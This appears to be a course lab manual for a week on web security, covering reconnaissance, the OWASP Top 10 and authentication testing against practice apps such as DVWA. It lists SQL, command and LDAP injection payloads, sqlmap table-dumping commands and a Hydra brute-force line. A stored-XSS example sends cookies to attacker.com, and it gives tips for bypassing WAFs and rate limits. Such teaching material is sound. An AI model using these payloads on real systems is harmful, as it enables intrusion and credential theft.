@@ -1,0 +1,420 @@
+# Week 4 - Web Security Fundamentals Lab Manual
+
+## Course Overview
+**Week 4: Web Security Fundamentals**
+**Duration:** Week 4
+**Deliverable:** Web Vulnerability Report
+
+## Learning Objectives
+By the end of this week, students will be able to:
+- Understand web application architecture and components
+- Identify and exploit common web vulnerabilities from OWASP Top 10 (2026)
+- Use web application security testing tools effectively
+- Understand authentication and authorization flaws
+- Implement basic web security controls
+- Analyze web application traffic for security issues
+
+## Topics Covered
+
+### 1. Web Architecture
+- Client-server model and HTTP/HTTPS protocols
+- Web application components (frontend, backend, database)
+- Session management and cookies
+- Same-origin policy and CORS
+- Web application frameworks and technologies
+
+### 2. OWASP Top 10 (2026 Edition)
+- A01: Broken Access Control
+- A02: Cryptographic Failures
+- A03: Injection (SQL, NoSQL, Command, LDAP)
+- A04: Insecure Design
+- A05: Security Misconfiguration
+- A06: Vulnerable and Outdated Components
+- A07: Identification and Authentication Failures
+- A08: Software and Data Integrity Failures
+- A09: Security Logging and Monitoring Failures
+- A10: Server-Side Request Forgery (SSRF)
+
+### 3. Authentication Flaws
+- Password-based authentication vulnerabilities
+- Session management flaws
+- Multi-factor authentication bypasses
+- OAuth and SAML vulnerabilities
+- JWT (JSON Web Token) security issues
+
+### 4. Web Application Testing
+- Manual testing techniques
+- Automated vulnerability scanning
+- Proxy tools for traffic interception
+- Input validation testing
+- Business logic testing
+
+## Tools Required
+- **Primary Tools:** Burp Suite (Community/Professional), OWASP ZAP
+- **Vulnerability Scanners:** Nikto, Dirb, Gobuster, SQLMap
+- **Browser Extensions:** Wappalyzer, Cookie Editor, User Agent Switcher
+- **Platforms:** DVWA, WebGoat, Mutillidae, bWAPP
+- **Command Line:** curl, wget, netcat
+- **Proxy Tools:** Burp Suite, OWASP ZAP, Proxyman
+
+## Lab Environment Setup
+- Kali Linux with web security tools
+- Vulnerable web applications (DVWA, WebGoat, Mutillidae)
+- Burp Suite Community/Professional Edition
+- Modern web browsers (Chrome, Firefox with security extensions)
+- Local web server environment (Apache/Nginx + PHP/Python/Node.js)
+
+## Lab Activities
+
+### Lab 4.1: Web Application Reconnaissance (60 minutes)
+**Objective:** Learn systematic approach to web application information gathering.
+
+**Instructions:**
+
+1. **Passive Information Gathering:**
+   ```bash
+   # Technology identification
+   whatweb https://example.com
+   
+   # DNS enumeration
+   dnsrecon -d example.com -t std
+   
+   # Search engine reconnaissance
+   # Use Google dorks: site:example.com filetype:pdf
+   
+   # Social media and public data gathering
+   ```
+
+2. **Active Information Gathering:**
+   ```bash
+   # Directory enumeration
+   dirb http://target.com /usr/share/wordlists/dirb/common.txt
+   gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+   
+   # Nikto web server scanning
+   nikto -h http://target.com
+   
+   # Nmap HTTP scripts
+   nmap -p80,443 --script http-enum target.com
+   ```
+
+3. **Technology Stack Analysis:**
+   - Identify web server, application framework, database
+   - Analyze HTTP headers for version information
+   - Check for known vulnerabilities in identified components
+   - Document technology fingerprints
+
+**Deliverable:** Comprehensive reconnaissance report with findings
+
+### Lab 4.2: Injection Vulnerabilities (90 minutes)
+**Objective:** Understand and exploit various injection vulnerabilities.
+
+**Instructions:**
+
+1. **SQL Injection Testing:**
+   ```sql
+   # Basic SQL injection tests
+   ' OR 1=1--
+   ' UNION SELECT null, version(), user()--
+   ' AND 1=2 UNION SELECT table_name FROM information_schema.tables--
+   
+   # SQLMap automated testing
+   sqlmap -u "http://target.com/page.php?id=1" --dbs
+   sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
+   sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
+   sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
+   ```
+
+2. **Command Injection Testing:**
+   ```bash
+   # Command injection payloads
+   ; ls -la
+   && whoami
+   | cat /etc/passwd
+   `id`
+   $(whoami)
+   ```
+
+3. **XSS (Cross-Site Scripting):**
+   ```javascript
+   // Reflected XSS
+   <script>alert('XSS')</script>
+   
+   // Stored XSS
+   <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
+   
+   // DOM-based XSS
+   javascript:alert(document.domain)
+   ```
+
+4. **LDAP Injection:**
+   ```
+   # LDAP injection attempts
+   *)(uid=*))(|(uid=*
+   *)(|(password=*))
+   ```
+
+**Deliverable:** Injection vulnerability exploitation report with proof-of-concepts
+
+### Lab 4.3: Authentication and Session Management (75 minutes)
+**Objective:** Identify and exploit authentication and session management flaws.
+
+**Instructions:**
+
+1. **Password Attacks:**
+   ```bash
+   # Brute force login with Hydra
+   hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
+   
+   # Custom wordlist generation
+   cewl http://target.com -d 3 -m 6 -w custom_wordlist.txt
+   ```
+
+2. **Session Management Testing:**
+   - Capture and analyze session cookies
+   - Test for session fixation vulnerabilities
+   - Check session timeout mechanisms
+   - Test concurrent session handling
+
+3. **JWT Security Testing:**
+   ```bash
+   # JWT analysis and manipulation
+   # Use jwt.io or custom tools
+   # Test for algorithm confusion attacks
+   # Check signature verification
+   ```
+
+4. **Multi-Factor Authentication Testing:**
+   - Test MFA implementation flaws
+   - Check for bypass mechanisms
+   - Analyze backup codes security
+   - Test rate limiting on MFA attempts
+
+**Deliverable:** Authentication vulnerability assessment report
+
+### Lab 4.4: Business Logic and Authorization (60 minutes)
+**Objective:** Identify business logic flaws and authorization bypass vulnerabilities.
+
+**Instructions:**
+
+1. **Access Control Testing:**
+   - Test horizontal privilege escalation
+   - Test vertical privilege escalation
+   - Check direct object references (IDOR)
+   - Test for missing function-level access control
+
+2. **Business Logic Flaws:**
+   - Test payment processing logic
+   - Check quantity/price manipulation
+   - Test workflow bypass vulnerabilities
+   - Analyze race condition vulnerabilities
+
+3. **File Upload Security:**
+   - Test file type restrictions
+   - Check file size limitations
+   - Test for executable file uploads
+   - Analyze file storage security
+
+**Deliverable:** Business logic vulnerability findings
+
+## Lab Tasks (To be completed during lab session)
+
+### Task 1: OWASP Top 10 Exploitation Matrix
+Create a comprehensive matrix documenting:
+- Each OWASP Top 10 vulnerability
+- Testing methodology for each
+- Common exploitation techniques
+- Potential impact assessment
+- Remediation strategies
+
+### Task 2: Automated vs Manual Testing Comparison
+Compare automated scanning results with manual testing findings:
+- Run automated scans using multiple tools
+- Perform manual testing using proxy tools
+- Document differences in findings
+- Analyze false positives and false negatives
+
+### Task 3: Custom Payload Development
+Develop custom payloads for:
+- SQL injection bypass techniques
+- XSS filter evasion
+- Command injection obfuscation
+- Authentication bypass methods
+
+### Task 4: Web Application Security Controls Assessment
+Evaluate implemented security controls:
+- Input validation mechanisms
+- Output encoding practices
+- Session security measures
+- Error handling security
+- Security headers implementation
+
+## Home Tasks (To be completed outside of class)
+
+### Home Task 1: Personal Web Application Security Audit (Due: Next week)
+**Objective:** Apply web security testing skills to a real-world scenario.
+
+**Requirements:**
+1. Set up a local web application (WordPress, Django, Node.js app, etc.)
+2. Perform comprehensive security assessment:
+   - Information gathering and reconnaissance
+   - Vulnerability scanning and manual testing
+   - Authentication and authorization testing
+   - Input validation testing
+3. Document all findings with proof-of-concepts
+4. Develop remediation recommendations
+5. Implement fixes and verify effectiveness
+6. Submit detailed security audit report (5-7 pages)
+
+### Home Task 2: Web Vulnerability Report Creation (Due: End of week)
+**Objective:** Create professional vulnerability assessment report.
+
+**Requirements:**
+1. Choose a publicly available vulnerable web application
+2. Perform systematic security testing covering:
+   - OWASP Top 10 vulnerabilities
+   - Authentication and session management
+   - Business logic flaws
+   - Configuration issues
+3. Document findings with:
+   - Executive summary
+   - Technical details and proof-of-concepts
+   - Risk ratings using CVSS
+   - Detailed remediation steps
+4. Include appendices with:
+   - Testing methodology
+   - Tools used
+   - Raw scan results
+5. Create presentation-ready summary
+6. Submit professional-quality report (8-10 pages)
+
+### Home Task 3: Security Tool Comparison Study (Due: Next week)
+**Objective:** Evaluate and compare web application security tools.
+
+**Requirements:**
+1. Compare at least 4 web application security tools:
+   - Burp Suite vs OWASP ZAP
+   - SQLMap vs manual SQL injection testing
+   - Nikto vs Dirb/Gobuster
+   - Browser-based tools vs command-line tools
+2. Test each tool against vulnerable applications
+3. Evaluate based on:
+   - Accuracy of results
+   - False positive/negative rates
+   - Ease of use
+   - Feature completeness
+   - Cost considerations
+4. Create comprehensive comparison matrix
+5. Provide recommendations for different use cases
+6. Submit tool evaluation report with testing evidence
+
+### Home Task 4: Secure Coding Research Project (Due: Next week)
+**Objective:** Research secure development practices for web applications.
+
+**Requirements:**
+1. Choose a web development framework (React, Angular, Django, Flask, etc.)
+2. Research security best practices for chosen framework:
+   - Input validation techniques
+   - Output encoding methods
+   - Authentication implementation
+   - Session management
+   - Security configuration
+3. Create secure coding guidelines document
+4. Develop code examples demonstrating:
+   - Vulnerable code patterns
+   - Secure implementations
+   - Security control implementations
+5. Test security implementations practically
+6. Submit secure coding guide with practical examples
+
+### Home Task 5: Web Application Firewall (WAF) Analysis (Due: Ongoing)
+**Objective:** Understand WAF technologies and bypass techniques.
+
+**Requirements:**
+1. Research different WAF solutions (CloudFlare, AWS WAF, F5, etc.)
+2. Set up local WAF testing environment
+3. Test WAF effectiveness against various attacks:
+   - SQL injection variants
+   - XSS payloads
+   - Command injection attempts
+   - File upload attacks
+4. Research and test WAF bypass techniques
+5. Document findings and evasion methods
+6. Create WAF assessment methodology
+7. Submit weekly progress reports
+
+## Assessment Criteria
+
+### Web Vulnerability Report Grading Rubric (100 points total)
+- **Vulnerability Discovery Completeness (25 points):** Thorough identification of security issues
+- **Technical Documentation Quality (25 points):** Clear explanations with proof-of-concepts
+- **Risk Assessment Accuracy (20 points):** Proper risk rating and impact analysis
+- **Remediation Recommendations (20 points):** Practical and effective solutions
+- **Professional Presentation (10 points):** Report quality and organization
+
+## Advanced Challenges (Optional Bonus)
+
+### Challenge 1: Zero-Day Discovery
+Identify a previously unknown vulnerability in an open-source web application and follow responsible disclosure process.
+
+### Challenge 2: Custom Web Application Scanner
+Develop a specialized web application scanner focusing on specific vulnerability types or technologies.
+
+### Challenge 3: Security Automation Framework
+Create an automated framework for continuous web application security testing.
+
+## Security and Ethics Guidelines
+
+### Testing Ethics:
+- Only test applications you own or have explicit authorization to test
+- Use isolated lab environments for learning
+- Do not attack production systems without permission
+- Follow responsible disclosure for any discovered vulnerabilities
+- Respect application terms of service and usage policies
+
+### Legal Considerations:
+- Understand applicable laws in your jurisdiction
+- Obtain proper authorization before testing
+- Document permission and scope clearly
+- Report illegal or harmful content discovered during testing
+
+## Common Issues and Solutions
+
+### Burp Suite Issues:
+- **Certificate errors:** Install Burp CA certificate in browser
+- **Proxy not intercepting:** Check browser proxy settings
+- **Performance issues:** Adjust thread and memory settings
+
+### SQLMap Issues:
+- **WAF detection:** Use tamper scripts and random delays
+- **False negatives:** Try different techniques and payloads
+- **Database connection issues:** Verify target accessibility
+
+### Testing Issues:
+- **Rate limiting:** Implement delays and session rotation
+- **Anti-automation:** Use different user agents and techniques
+- **False positives:** Always verify findings manually
+
+## Additional Resources
+- OWASP Web Security Testing Guide
+- Burp Suite User Guide and Documentation
+- Web Application Hacker's Handbook by Dafydd Stuttard
+- OWASP Top 10 Project: https://owasp.org/www-project-top-ten/
+- PortSwigger Web Security Academy: https://portswigger.net/web-security
+- SANS Web Application Security courses
+
+## Tips for Success
+1. Practice systematic testing methodology
+2. Always verify automated scan results manually
+3. Understand the business context of identified vulnerabilities
+4. Keep detailed documentation of testing procedures
+5. Focus on understanding root causes, not just symptoms
+6. Practice responsible disclosure principles
+7. Stay updated with latest web security trends and threats
+
+## Lab Safety and Cleanup
+- Always use isolated lab environments
+- Clean up any test data or accounts created during testing
+- Reset vulnerable applications to clean state after testing
+- Properly dispose of any sensitive data discovered during testing
+- Report any unintended impacts or damages immediately
